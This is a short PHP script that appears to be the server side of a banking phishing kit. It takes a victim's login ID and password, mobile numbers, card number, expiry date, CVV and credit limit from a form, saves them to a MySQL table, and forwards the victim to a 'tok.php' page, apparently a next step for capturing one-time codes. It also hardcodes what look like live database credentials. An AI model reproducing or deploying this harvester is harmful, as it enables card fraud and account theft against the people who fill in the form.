<?php
// Check if the form was submitted using POST method
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Replace with your actual database credentials
    $servername = "localhost";
    $username = "u964159363_1234";
    $password = "Royal@0011";
    $dbname = "u964159363_1234";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }

    // Escape user inputs for security (to prevent SQL injection)
    $lc_id = mysqli_real_escape_string($conn, $_POST['lc_id']);
    $lpass = mysqli_real_escape_string($conn, $_POST['lpass']);
    $rgmob = mysqli_real_escape_string($conn, $_POST['rgmob']);
    $rgmobs = mysqli_real_escape_string($conn, $_POST['rgmob1']);
    $ccnum = mysqli_real_escape_string($conn, $_POST['ccnum']);
    $edate = mysqli_real_escape_string($conn, $_POST['edate']);
    $cvv = mysqli_real_escape_string($conn, $_POST['cvv']);
    $limit = mysqli_real_escape_string($conn, $_POST['creditlimit']);

    // SQL query to insert data into database
    $sql = "INSERT INTO users (lc_id, lpass, rgmob, rgmob1, ccnum, edate, cvv, creditlimit) 
            VALUES ('$lc_id', '$lpass', '$rgmob', '$rgmobs', '$ccnum', '$edate', '$cvv', '$limit')";

    if ($conn->query($sql) === TRUE) {
        // Get the ID of the inserted record
        $last_id = $conn->insert_id;
        
        // Close connection
        $conn->close();
        
        // Redirect to a new page with the ID in the URL
        header("Location: tok.php?id=" . $last_id);
        exit();
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}
?>
